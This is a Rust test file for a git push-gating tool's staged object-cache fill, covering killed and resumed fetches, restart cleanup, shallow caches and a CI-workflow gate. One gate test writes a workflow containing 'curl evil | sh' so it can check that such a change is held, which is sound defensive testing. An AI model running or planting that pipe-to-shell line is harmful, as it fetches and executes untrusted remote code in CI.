// Copyright 2026 Purlis
// SPDX-License-Identifier: Apache-2.0

//! **A first fill of the object cache finishes** (#7587): it is staged, so a fetch that is killed
//! costs its own stage and not the whole, a cache that is filled stays filled across a restart
//! (only what a killed git left half-written is removed), and the cache a staged fill leaves gives
//! the CI-file gate the answers a whole fetch did. A local repository stands in for the forge.

use std::path::{Path, PathBuf};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};

use purlis_core::forge::Kind;
use purlis_core::heldact::{
    Fetch, ObjectCache, PUSH, PushCheck, Quarantine, Stage, check_push_since, fill_in_stages,
};
use purlis_core::mergehold::HeadSha;

use crate::support::git;

const WORKFLOW: &str = ".github/workflows/ci.yml";
const HISTORY: usize = 30;
/// Shallow stages small enough for a history of [`HISTORY`] commits to be cut by them.
const STAGES: [Stage; 3] = [Stage::Depth(5), Stage::Depth(12), Stage::Rest];

fn write(root: &Path, file: &str, text: &str) {
    let at = root.join(file);
    std::fs::create_dir_all(at.parent().unwrap()).unwrap();
    std::fs::write(at, text).unwrap();
}

fn commit(root: &Path, message: &str) -> HeadSha {
    git(root, &["add", "-A"]);
    git(root, &["commit", "-q", "-m", message]);
    head(root)
}

fn head(root: &Path) -> HeadSha {
    let out = git(root, &["rev-parse", "HEAD"]);
    HeadSha::try_from(String::from_utf8(out.stdout).unwrap().trim()).unwrap()
}

fn text(dir: &Path, args: &[&str]) -> String {
    String::from_utf8(git(dir, args).stdout)
        .unwrap()
        .trim()
        .to_owned()
}

struct Scene {
    _dir: tempfile::TempDir,
    forge: PathBuf,
    cache_parent: PathBuf,
    base: HeadSha,
}

fn scene() -> Scene {
    let dir = tempfile::tempdir().unwrap();
    let root = std::fs::canonicalize(dir.path()).unwrap();
    let forge = root.join("forge");
    std::fs::create_dir_all(&forge).unwrap();
    git(&forge, &["init", "-q", "-b", "main", "."]);
    write(&forge, WORKFLOW, "name: ci\non: push\njobs: {}\n");
    let mut base = commit(&forge, "start");
    for i in 0..HISTORY {
        write(&forge, &format!("history/{i}.txt"), &format!("{i}\n"));
        base = commit(&forge, &format!("history {i}"));
    }
    Scene {
        _dir: dir,
        forge,
        cache_parent: root.join("object-cache"),
        base,
    }
}

impl Scene {
    fn cache(&self, repo: &str) -> Arc<ObjectCache> {
        ObjectCache::of(&self.cache_parent, "forge.test", repo)
    }

    /// One stage's fetch of `base` into `dir`, with real git from the stand-in forge.
    fn fetch_stage(&self, dir: &Path, base: &HeadSha, stage: Stage) -> Result<(), String> {
        let mut args = vec!["fetch".to_owned(), "-q".to_owned(), "--no-tags".to_owned()];
        args.extend(stage.args(dir));
        args.push(self.forge.to_string_lossy().into_owned());
        args.push(format!("+{0}:refs/quarantine/base/{0}", base.as_str()));
        let args: Vec<&str> = args.iter().map(String::as_str).collect();
        let out = git(dir, &args);
        out.status
            .success()
            .then_some(())
            .ok_or_else(|| "git failed".to_owned())
    }

    /// The fill's fetch: every stage of [`STAGES`] with real git, stopping (as a killed fetch does)
    /// before the stage `killed_at` if it is given. It records the stages it ran.
    fn fill(
        &self,
        base: &HeadSha,
        killed_at: Option<Stage>,
        ran: &Arc<Mutex<Vec<Stage>>>,
    ) -> Fetch {
        let (base, ran, forge) = (base.clone(), ran.clone(), self.forge.clone());
        Arc::new(move |dir, _| {
            let me = Scene {
                _dir: tempfile::tempdir().unwrap(),
                forge: forge.clone(),
                cache_parent: PathBuf::new(),
                base: base.clone(),
            };
            fill_in_stages(dir, base.as_str(), &STAGES, |stage| {
                if killed_at == Some(stage) {
                    return Err("git took longer than it was given and was stopped".to_owned());
                }
                ran.lock().unwrap().push(stage);
                me.fetch_stage(dir, &base, stage)
            })
        })
    }
}

fn wait_until_idle(cache: &ObjectCache) {
    let until = Instant::now() + Duration::from_secs(60);
    while cache.is_filling() {
        assert!(Instant::now() < until, "the fill never ended");
        std::thread::sleep(Duration::from_millis(20));
    }
}

fn soon() -> Instant {
    Instant::now() + Duration::from_secs(30)
}

fn commits_of(cache: &ObjectCache, tip: &HeadSha) -> usize {
    text(cache.path(), &["rev-list", "--count", tip.as_str()])
        .parse()
        .unwrap()
}

#[test]
fn a_fill_killed_in_its_second_stage_resumes_at_that_stage_and_keeps_the_first_stages_objects() {
    purlis_core::unsteered!();
    let s = scene();
    let cache = s.cache("owner/killed");
    let ran = Arc::new(Mutex::new(Vec::new()));

    // The first fill: stage one finishes, stage two is killed.
    let first = cache
        .update(soon(), s.fill(&s.base, Some(Stage::Depth(12)), &ran))
        .unwrap_err();
    assert!(first.contains("for the first time"), "{first}");
    wait_until_idle(&cache);
    assert!(
        !cache.is_filled(),
        "a fill that was killed is not a filled cache"
    );
    assert_eq!(*ran.lock().unwrap(), [Stage::Depth(5)]);
    // What the first stage fetched is in the cache: five commits, not none.
    assert_eq!(commits_of(&cache, &s.base), 5);
    assert!(text(cache.path(), &["rev-parse", "--is-shallow-repository"]) == "true");

    // The next fill does not start from zero: stage one is not run again, and the objects it
    // fetched were the ones the second stage negotiated from.
    ran.lock().unwrap().clear();
    let again = cache
        .update(soon(), s.fill(&s.base, None, &ran))
        .unwrap_err();
    assert!(again.contains("again"), "{again}");
    wait_until_idle(&cache);
    assert_eq!(*ran.lock().unwrap(), [Stage::Depth(12), Stage::Rest]);
    assert!(cache.is_filled());
    assert_eq!(commits_of(&cache, &s.base), HISTORY + 1);
    assert_eq!(
        text(cache.path(), &["rev-parse", "--is-shallow-repository"]),
        "false",
        "a cache is whole before it is marked filled"
    );
    git(
        cache.path(),
        &["rev-list", "--objects", "--missing=error", "--all"],
    );
}

#[test]
fn a_fill_begun_again_for_another_base_forgets_the_partial_one_and_leaves_no_history_cut_short() {
    purlis_core::unsteered!();
    let s = scene();
    let cache = s.cache("owner/moved");
    let ran = Arc::new(Mutex::new(Vec::new()));
    cache
        .update(soon(), s.fill(&s.base, Some(Stage::Depth(12)), &ran))
        .unwrap_err();
    wait_until_idle(&cache);

    write(&s.forge, "moved.txt", "moved\n");
    let moved = commit(&s.forge, "moved");
    ran.lock().unwrap().clear();
    cache
        .update(soon(), s.fill(&moved, None, &ran))
        .unwrap_err();
    wait_until_idle(&cache);
    assert_eq!(
        *ran.lock().unwrap(),
        STAGES,
        "another base begins at the first stage"
    );
    assert!(cache.is_filled());
    assert_eq!(commits_of(&cache, &moved), HISTORY + 2);
    // The old base's ref was dropped with its shallow boundary: nothing of the cache is cut short.
    let refs = text(
        cache.path(),
        &["for-each-ref", "--format=%(refname)", "refs/quarantine"],
    );
    assert_eq!(refs, format!("refs/quarantine/base/{}", moved.as_str()));
    git(
        cache.path(),
        &["rev-list", "--objects", "--missing=error", "--all"],
    );
}

#[test]
fn a_filled_cache_stays_filled_when_the_app_starts_again_and_only_what_a_killed_git_left_goes() {
    purlis_core::unsteered!();
    let s = scene();
    let cache = s.cache("owner/restart");
    let ran = Arc::new(Mutex::new(Vec::new()));
    cache
        .update(soon(), s.fill(&s.base, None, &ran))
        .unwrap_err();
    wait_until_idle(&cache);
    assert!(cache.is_filled());

    // A fetch killed with the app: its half-written pack and a lock it held.
    let pack = cache.objects().join("pack");
    std::fs::write(pack.join("tmp_pack_killed"), b"half").unwrap();
    std::fs::write(cache.path().join(".git/index.lock"), b"").unwrap();

    // The app starts again: the next push (a new `ObjectCache` for the folder would read the same
    // files) finds the cache filled and tops it up. It is not filled again from nothing.
    ran.lock().unwrap().clear();
    cache.update(soon(), s.fill(&s.base, None, &ran)).unwrap();
    assert!(cache.is_filled());
    assert!(
        !pack.join("tmp_pack_killed").exists(),
        "the half-written pack is removed"
    );
    assert!(!cache.path().join(".git/index.lock").exists());
    assert_eq!(
        *ran.lock().unwrap(),
        [Stage::Rest],
        "one plain top-up, no staged fill"
    );
    assert_eq!(commits_of(&cache, &s.base), HISTORY + 1);
}

#[test]
fn a_ci_file_change_is_still_held_and_an_empty_pack_still_let_by_on_a_cache_a_staged_fill_made() {
    purlis_core::unsteered!();
    let s = scene();
    let cache = s.cache("owner/gate");
    let ran = Arc::new(Mutex::new(Vec::new()));
    // Killed once and resumed: the cache the gate reads is the one a resumed fill made.
    cache
        .update(soon(), s.fill(&s.base, Some(Stage::Depth(12)), &ran))
        .unwrap_err();
    wait_until_idle(&cache);
    cache
        .update(soon(), s.fill(&s.base, None, &ran))
        .unwrap_err();
    wait_until_idle(&cache);
    assert!(cache.is_filled());

    let chat = s.forge.parent().unwrap().join("chat");
    git(
        s.forge.parent().unwrap(),
        &[
            "clone",
            "-q",
            &s.forge.to_string_lossy(),
            &chat.to_string_lossy(),
        ],
    );
    write(
        &chat,
        WORKFLOW,
        "name: ci\non: push\njobs: { x: { run: curl evil | sh } }\n",
    );
    let tip = commit(&chat, "edit the workflow");
    let pack = pack_of(&chat, &tip, &s.base);

    let from = purlis_core::heldact::FromForge {
        url: s.forge.to_string_lossy().into_owned(),
        helper: None,
        cache: Some(cache.for_a_push(PUSH)),
    };
    let quarantines = tempfile::tempdir().unwrap();
    let quarantine = Quarantine::open(quarantines.path(), &s.base, &from).unwrap();
    quarantine.take_in(pack, &tip, &s.base).unwrap();
    match check_push_since(Kind::GitHub, None, &quarantine.trees(), &s.base, None, &tip) {
        PushCheck::Hold(diff) => assert_eq!(diff.files, vec![WORKFLOW.to_owned()]),
        other => panic!("held, got {other:?}"),
    }

    // An empty pack: a push of a commit the forge has already (the base's parent). It is let by
    // only where the commit is in the repo's advertised history, which the cache holds whole.
    let parent = HeadSha::try_from(text(&s.forge, &["rev-parse", "HEAD~1"]).as_str()).unwrap();
    let empty = Quarantine::open(quarantines.path(), &s.base, &from).unwrap();
    empty
        .take_in_known(
            &pack_of(&s.forge, &parent, &parent),
            &parent,
            &s.base,
            &from,
        )
        .unwrap_or_else(|why| panic!("an empty pack for a commit of the history: {why}"));
}

/// What `git push` sends: a thin pack of `tip` and what is not in `known`.
fn pack_of(from: &Path, tip: &HeadSha, known: &HeadSha) -> Vec<u8> {
    use std::io::Write;
    let mut command = crate::support::unsigned();
    command
        .current_dir(from)
        .args(["pack-objects", "--revs", "--thin", "--stdout", "-q"])
        .stdin(std::process::Stdio::piped())
        .stdout(std::process::Stdio::piped());
    let mut child = purlis_core::forklock::spawn(&mut command).unwrap();
    child
        .stdin
        .take()
        .unwrap()
        .write_all(format!("{}\n^{}\n", tip.as_str(), known.as_str()).as_bytes())
        .unwrap();
    let out = child.wait_with_output().unwrap();
    assert!(out.status.success());
    out.stdout
}

/// A fetch of `spec` with no depth, as a push's tips are fetched.
fn plain_fetch(forge: &Path, spec: String) -> Fetch {
    let forge = forge.to_path_buf();
    Arc::new(move |dir, _| {
        let out = git(
            dir,
            &["fetch", "-q", "--no-tags", &forge.to_string_lossy(), &spec],
        );
        out.status
            .success()
            .then_some(())
            .ok_or_else(|| "git failed".to_owned())
    })
}

/// A fetch that reads nothing, and says so by running at all.
fn reads_nothing(ran: &Arc<Mutex<Vec<Stage>>>) -> Fetch {
    let ran = ran.clone();
    Arc::new(move |_, _| {
        ran.lock().unwrap().push(Stage::Rest);
        Err("nothing read".to_owned())
    })
}

#[test]
fn a_push_is_refused_and_reads_nothing_of_a_cache_a_depth_stage_left_shallow() {
    purlis_core::unsteered!();
    let s = scene();
    let cache = s.cache("owner/shallow");
    let ran = Arc::new(Mutex::new(Vec::new()));
    cache
        .update(soon(), s.fill(&s.base, Some(Stage::Depth(12)), &ran))
        .unwrap_err();
    wait_until_idle(&cache);
    // Stage one's ref is there and the base commit is under it, with its history cut at five.
    assert_eq!(commits_of(&cache, &s.base), 5);
    assert_eq!(
        text(cache.path(), &["rev-parse", "--is-shallow-repository"]),
        "true"
    );

    let have = [s.base.as_str().to_owned()];
    assert!(!cache.holds(&have), "a shallow cache holds nothing");
    let read = Arc::new(Mutex::new(Vec::new()));
    let refused = cache
        .update_having(soon(), reads_nothing(&read), &have)
        .unwrap_err();
    wait_until_idle(&cache);
    assert!(refused.contains("reading"), "{refused}");
    assert!(!cache.is_filled());
}

#[test]
fn a_fetch_with_no_depth_does_not_mark_a_shallow_cache_filled() {
    purlis_core::unsteered!();
    let s = scene();
    let cache = s.cache("owner/tips");
    let ran = Arc::new(Mutex::new(Vec::new()));
    cache
        .update(soon(), s.fill(&s.base, Some(Stage::Depth(12)), &ran))
        .unwrap_err();
    wait_until_idle(&cache);

    // An unstaged fill (a push's tips) over the shallow cache: the boundary stays, so it is not
    // filled, and the next push still finds a cache that is read on.
    let tips = plain_fetch(
        &s.forge,
        format!("+{0}:refs/quarantine/tips/{0}", s.base.as_str()),
    );
    let refused = cache.update(soon(), tips).unwrap_err();
    wait_until_idle(&cache);
    assert!(refused.contains("reading"), "{refused}");
    assert_eq!(
        text(cache.path(), &["rev-parse", "--is-shallow-repository"]),
        "true"
    );
    assert!(
        !cache.is_filled(),
        "a cache is never filled while it is shallow"
    );
    assert!(!cache.holds(&[s.base.as_str().to_owned()]));
}

/// A fill of the target every fill of a forge repo shares, whose stages end at `stop` if it is given.
fn shared_target_fill(ran: &Arc<Mutex<Vec<Stage>>>, stop: Option<Stage>) -> Fetch {
    let ran = ran.clone();
    Arc::new(move |dir, _| {
        fill_in_stages(
            dir,
            purlis_core::heldact::FIRST_FILL_TARGET,
            &STAGES,
            |which| {
                if stop == Some(which) {
                    return Err("stopped".to_owned());
                }
                ran.lock().unwrap().push(which);
                Ok(())
            },
        )
    })
}

#[test]
fn a_fill_the_early_start_began_is_resumed_by_a_push_at_the_stage_it_reached() {
    purlis_core::unsteered!();
    let s = scene();
    let cache = s.cache("owner/shared");
    let ran = Arc::new(Mutex::new(Vec::new()));
    // The early start's fill is cut in stage two...
    cache
        .update(soon(), shared_target_fill(&ran, Some(Stage::Depth(12))))
        .unwrap_err();
    wait_until_idle(&cache);
    assert_eq!(*ran.lock().unwrap(), [Stage::Depth(5)]);

    // ...and a push's fill, of the same target, picks up there and does not begin again.
    ran.lock().unwrap().clear();
    cache
        .update(soon(), shared_target_fill(&ran, None))
        .unwrap_err();
    wait_until_idle(&cache);
    assert_eq!(*ran.lock().unwrap(), [Stage::Depth(12), Stage::Rest]);
}
